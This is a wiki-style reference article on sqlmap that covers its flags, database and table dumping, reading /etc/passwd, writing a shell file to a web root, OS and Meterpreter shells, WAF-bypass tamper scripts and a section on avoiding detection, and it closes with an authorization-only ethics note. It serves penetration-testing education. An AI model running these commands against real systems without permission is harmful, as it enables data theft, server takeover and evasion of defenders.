---
title: sqlmap
slug: sqlmap
category: tools
summary: sqlmap is an open-source automated SQL injection detection and exploitation tool. It supports every major database engine, every injection class, and ships with built-in privilege escalation, file system access, and operating system shell features once SQL injection is found.
related: [sql-injection, burp-suite, owasp-top-10]
aliases: [sqlmap, SQLmap]
updated: 2026-05-25
---

**sqlmap** is an open-source automated [SQL injection](/wiki/sql-injection) detection and exploitation tool. It supports every major database engine (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MongoDB-like NoSQL via plugins) and every injection class — error-based, boolean blind, time-based blind, UNION-based, stacked queries, out-of-band. Once it finds a vulnerable parameter, sqlmap can enumerate databases, dump tables, read files, write files, and pop OS shells without leaving the command line.

Created by Bernardo Damele and Miroslav Stampar; first release 2006.

## Why sqlmap is the right first tool

A hand-crafted SQLi attack requires figuring out:

1. Which parameter is vulnerable.
2. What injection class works (the database may swallow errors silently).
3. Which DBMS you're attacking — payloads vary.
4. How to enumerate the schema.
5. How to dump data efficiently without triggering rate limits.
6. How to handle WAF interference.

sqlmap automates all of this. Point it at a URL parameter, let it work, watch the output. A typical first invocation:

```bash
sqlmap -u "http://target.example/item?id=1"
```

sqlmap will probe every injection class, fingerprint the DBMS, identify the injection technique that works, and report back. Subsequent invocations use the cached results.

## Core flags

The flags worth memorizing:

| Flag | Purpose |
|---|---|
| `-u URL` | Target URL with at least one parameter. |
| `-r request.txt` | Use a full HTTP request from a file. Best for authenticated targets — paste from [Burp Suite](/wiki/burp-suite). |
| `--data="...&id=1"` | POST body data. Use with `-u` for POST endpoints. |
| `--cookie="PHPSESSID=..."` | Send cookies (e.g. session cookie for authenticated testing). |
| `--level=1..5` | Test depth — higher tries more injection techniques + parameter positions. 3 is a reasonable default. |
| `--risk=1..3` | How aggressive the payloads are. Higher includes payloads that may modify data (`UPDATE`, `DROP`). 1 is the safe default. |
| `--dbms=mysql` | Hint the DBMS — skips fingerprinting. |
| `--technique=BEUSTQ` | Restrict to specific injection classes (B=boolean blind, E=error, U=union, S=stacked, T=time, Q=inline query). |
| `--batch` | Non-interactive mode — sqlmap picks defaults for every prompt. |
| `--threads=10` | Concurrency. Helps for time-based blind; rarely above 10 for politeness. |

## Enumeration commands

Once injection is confirmed, sqlmap dumps schema progressively:

```bash
# List every database the DBMS has
sqlmap -u "..." --dbs

# List tables in a specific database
sqlmap -u "..." -D database_name --tables

# List columns in a specific table
sqlmap -u "..." -D database_name -T users --columns

# Dump everything in a specific table
sqlmap -u "..." -D database_name -T users --dump

# Dump only specific columns (less loud, faster)
sqlmap -u "..." -D database_name -T users -C email,password_hash --dump

# Dump the entire database (very loud — use with care)
sqlmap -u "..." -D database_name --dump-all
```

The cached results live in `~/.local/share/sqlmap/output/<hostname>/` (or `~/.sqlmap/` on older versions) — sqlmap won't redundantly re-enumerate the same target.

## Beyond data — host-level features

sqlmap's most underrated capability is escalating from a SQL injection to operating-system-level access on the database host:

```bash
# Read an arbitrary file from the database server's filesystem
sqlmap -u "..." --file-read=/etc/passwd

# Write a file to the database server (requires write privileges)
sqlmap -u "..." --file-write=local.exe --file-dest=/var/www/html/shell.exe

# Drop into an interactive OS shell
sqlmap -u "..." --os-shell

# Drop into an interactive SQL shell
sqlmap -u "..." --sql-shell

# Pop a Meterpreter session via Metasploit pivot (Windows MSSQL only)
sqlmap -u "..." --os-pwn
```

`--os-shell` is the canonical "I have SQLi → I have RCE" leap. Requires write privileges on the database (`FILE` in MySQL, `xp_cmdshell` in MSSQL) which is itself a configuration weakness sqlmap can exploit through its own privilege-escalation modules.

## WAF bypasses — tamper scripts

Many production targets have a Web Application Firewall in front. sqlmap ships dozens of *tamper scripts* that obfuscate payloads to slip past WAF signatures:

```bash
# Chain space-to-comment and randomized-case obfuscation
sqlmap -u "..." --tamper=space2comment,randomcase

# Common heavy tamper chain
sqlmap -u "..." --tamper=between,randomcase,space2plus

# List all available tamper scripts
sqlmap --list-tampers
```

Each tamper script is independent. Combine them; test what works. The trial-and-error is the load-bearing skill — no fixed combination defeats every WAF.

## Tips for not getting caught

`--random-agent` rotates a realistic User-Agent string each request — defeats lazy "User-Agent: sqlmap/..." detection.

`--proxy=http://127.0.0.1:8080` routes through [Burp Suite](/wiki/burp-suite) so you can see exactly what sqlmap sent and what the server returned.

`--delay=1 --timeout=30` slows the scan; less obvious in logs.

Use `-r request.txt` from Burp instead of `-u URL` whenever possible. The full HTTP request includes the cookies, headers, and POST body that the target's authorization layer needs.

## Limitations

sqlmap is *very good* at finding SQL injection where it exists. It is *not* a substitute for:

- **Manual testing on heavily-WAF'd targets.** When automation fails, one hand-crafted payload often succeeds. Tamper scripts help, not solve.
- **Logic-flaw discovery.** sqlmap finds injection in known parameters; it doesn't find unintended database access via flawed business logic (an IDOR that exposes a SQL-typed identifier without going through injection).
- **Non-SQL databases.** sqlmap has some NoSQL support but it's narrow. MongoDB injection, GraphQL-database-leakage, ElasticSearch-query injection all need different tools.
- **Bug bounty scope of legality.** sqlmap loaded with `--risk=3 --level=5 --dump-all` can absolutely modify or destroy data. Don't.

## Ethics + legality

Same rule as every other offensive tool: only against targets you own or have written permission to test. sqlmap is loud, signature-rich, and frequently logged — running it against unauthorized targets is detectable and prosecutable.

## Further reading

- [sqlmap GitHub](https://github.com/sqlmapproject/sqlmap).
- [sqlmap official wiki](https://github.com/sqlmapproject/sqlmap/wiki).
- [PortSwigger Web Security Academy: SQL injection (interactive labs)](https://portswigger.net/web-security/sql-injection).
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html).
